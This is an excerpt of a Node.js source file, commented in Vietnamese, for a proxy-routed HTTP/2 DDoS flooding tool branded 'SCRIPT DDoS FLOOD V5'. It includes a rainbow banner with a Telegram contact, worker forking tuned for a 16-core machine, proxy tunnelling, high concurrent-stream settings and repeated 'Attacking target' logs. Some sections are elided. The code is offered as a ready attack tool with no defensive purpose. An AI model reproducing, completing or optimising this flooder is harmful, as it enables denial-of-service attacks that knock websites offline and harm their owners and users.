...
const MAX_RAM_PERCENTAGE = 85; // Tăng lên 85% vì có nhiều RAM
const RESTART_DELAY = 500; // Giảm delay restart

// Tối ưu hóa cho 16 luồng CPU
const OPTIMAL_THREADS = 16; // Sử dụng đúng số luồng CPU
const THREAD_MULTIPLIER = 2; // Nhân 2 để tận dụng hyper-threading
const MAX_CONCURRENT_CONNECTIONS = 1000; // Tăng số kết nối đồng thời
const CONNECTION_TIMEOUT = 30000; // Tăng timeout cho kết nối ổn định

 if (cluster.isMaster) {
  // Tạo banner đẹp giống v4.js
  ...
  const toolName = '🚀 SCRIPT DDoS FLOOD V5 🚀';
  const contact = '🆔 Telegram: @Ngzz Dat   ☎️ Contact: Ngzz Dat';
  const credit = 'Developed & Maintained by Ngzz Dat 🛠️';
  ...
  // Thêm khoảng trống để đẩy banner xuống giữa màn hình
  for (let i = 0; i < 5; i++) {
      console.log('');
  }
  
  // Banner với font lớn hơn và hiệu ứng đặc biệt
  console.log(top.rainbow.bold);
  console.log(empty.rainbow);
  console.log(('║' + centerText(toolName, boxWidth) + '║').rainbow.bold);
  console.log(empty.rainbow);
  console.log(('║' + centerText(contact, boxWidth) + '║').rainbow.bold);
  console.log(empty.rainbow);
  console.log(('║' + centerText(credit, boxWidth) + '║').rainbow.bold);
  console.log(empty.rainbow);
  console.log(sep.rainbow.bold);
  
  // In thông số với font lớn và màu nổi bật
  const infoLines = [target, duration, rate, threads, proxy];
  for (const line of infoLines) {
      const pad = boxWidth - line.replace(/\u001b\[[0-9;]*m/g, '').length;
      console.log(('║  ' + line + ' '.repeat(pad - 2) + '║').rainbow.bold);
  }
  console.log(bottom.rainbow.bold);
  
  // Thông báo khởi động với font lớn và hiệu ứng đặc biệt
  console.log('\n[🚀] FLOOD V5 DDoS Tool is ready! Starting attack...\n'.rainbow.bold);
  console.log('='.repeat(80).rainbow.bold);
  
  // Thêm khoảng trống để tạo không gian cho log
  for (let i = 0; i < 3; i++) {
      console.log('');
  }
    const restartScript = () => {
	...
	// Hiển thị log tấn công với màu sắc luân phiên (giống v4.js)
	const colors = ['red', 'green', 'yellow', 'magenta', 'cyan', 'blue'];
	let colorIndex = 0;
	let attackCount = 0;
	let logLines = [];
	
	// Function để in lại banner
	...
	setInterval(() => {
		...
		const logLine = `[⚔️] Attacking ${args.target}... (Attack #${attackCount})`;
		
		// Thêm log mới vào danh sách (giữ tối đa 20 dòng)
		logLines.push(logLine);
		if (logLines.length > 20) {
			logLines.shift();
		}
		
		// Clear màn hình và in lại banner + log
		printBanner();
		
		// In lại tất cả log lines với màu sắc (font nhỏ hơn)
		logLines.forEach((line, index) => {
			const lineColor = colors[(colorIndex - logLines.length + index) % colors.length];
			console.log(line[lineColor].dim); // Thêm .dim để làm mờ
		});
		
		colorIndex++;
	}, 1000); // Tăng lên 1000ms (1 giây) để chậm hơn và dễ nhìn
	
	// Log thống kê định kỳ
	setInterval(() => {
		const statsColors = ['cyan', 'yellow', 'green'];
		const statsColor = statsColors[Math.floor(Math.random() * statsColors.length)];
		const statsLine = `[📊] Total attacks sent: ${attackCount} | Target: ${args.target} | Threads: ${args.threads}`;
		
		// Thêm log thống kê vào danh sách
		logLines.push(statsLine);
		if (logLines.length > 20) {
			logLines.shift();
		}
	...
	}, 5000); // Hiển thị thống kê mỗi 5 giây
	
    // Tối ưu hóa số threads cho 16 luồng CPU
    const optimalThreads = Math.min(args.threads, OPTIMAL_THREADS * THREAD_MULTIPLIER);
    console.log(`[⚙️] Optimized for 16-core CPU: Using ${optimalThreads} threads`.cyan);
    
    for (let counter = 1; counter <= optimalThreads; counter++) {
        cluster.fork();
    }
 ...
 class NetSocket {
  ...
  HTTP(options, callback) {
    ...
    // Tối ưu hóa cho 64GB RAM
    connection.setTimeout(CONNECTION_TIMEOUT);
    connection.setKeepAlive(true, 300000); // 5 phút keep-alive
    connection.setNoDelay(true);
    connection.setMaxListeners(MAX_CONCURRENT_CONNECTIONS);
   ...
   connection.on("data", chunk => {
       ...
       if (isAlive === false) {
           ...
           // Log khi proxy có lỗi - chỉ khi cần thiết
           if (Math.random() < 0.002) { // Giảm xuống 0.2% số lần
               const proxyErrorColors = ['red', 'magenta'];
               const proxyErrorColor = proxyErrorColors[Math.floor(Math.random() * proxyErrorColors.length)];
               console.log(`[❌] Proxy ${options.address} failed: invalid response`[proxyErrorColor].dim);
           }
           
           return callback(undefined, "error: invalid response from proxy server");
       }
       
       // Log khi proxy kết nối thành công - chỉ khi cần thiết
       if (Math.random() < 0.02) { // Giảm xuống 2% số lần
           const proxySuccessColors = ['green', 'cyan'];
           const proxySuccessColor = proxySuccessColors[Math.floor(Math.random() * proxySuccessColors.length)];
           console.log(`[🌐] Proxy ${options.address} connected successfully!`[proxySuccessColor].dim);
       }
...
const randstrsValue = randstrs(10);
  function runFlooder() {
    ...
    // In log tấn công từ worker thread (bỏ màu trắng) - chỉ khi cần thiết
    if (Math.random() < 0.05) { // Giảm xuống 5% số lần để ít spam hơn
        const workerColors = ['red', 'green', 'yellow', 'magenta', 'cyan', 'blue'];
        const randomColor = workerColors[Math.floor(Math.random() * workerColors.length)];
        console.log(`[⚔️] Attacking ${args.target} via ${proxyAddr}...`[randomColor].dim);
    }
    const nm = [
      "110.0.0.0",
      "111.0.0.0",
...
let headers = {
 ...
 Socker.HTTP(proxyOptions, (connection, error) => {
    ...
    // Tối ưu hóa HTTP/2 settings cho 64GB RAM
    const settings = {
       enablePush: false,
       initialWindowSize: 65535, // Tối ưu window size
       maxConcurrentStreams: MAX_CONCURRENT_CONNECTIONS,
...
client.settings(settings);
    client.on("connect", () => {
       // Log khi kết nối thành công - chỉ khi cần thiết
       if (Math.random() < 0.01) { // Giảm xuống 1% số lần
           const successColors = ['green', 'cyan', 'blue'];
           const successColor = successColors[Math.floor(Math.random() * successColors.length)];
           console.log(`[✅] Connected to ${args.target} successfully!`[successColor].dim);
       }
...
const request = client.request({
    ...
    client.on("close", () => {
      ...
      connection.destroy();
             ...
             // Log khi kết nối đóng - chỉ khi cần thiết
       if (Math.random() < 0.005) { // Giảm xuống 0.5% số lần
           const closeColors = ['yellow', 'blue'];
           const closeColor = closeColors[Math.floor(Math.random() * closeColors.length)];
           console.log(`[🔌] Connection closed to ${args.target}`[closeColor].dim);
       }
  ...
  client.on("error", error => {
      ...
      connection.destroy();
             ...
             // Log khi có lỗi - chỉ khi cần thiết
       if (Math.random() < 0.005) { // Giảm xuống 0.5% số lần
           const errorColors = ['red', 'magenta'];
           const errorColor = errorColors[Math.floor(Math.random() * errorColors.length)];
           console.log(`[❌] Connection error to ${args.target}`[errorColor].dim);
       }
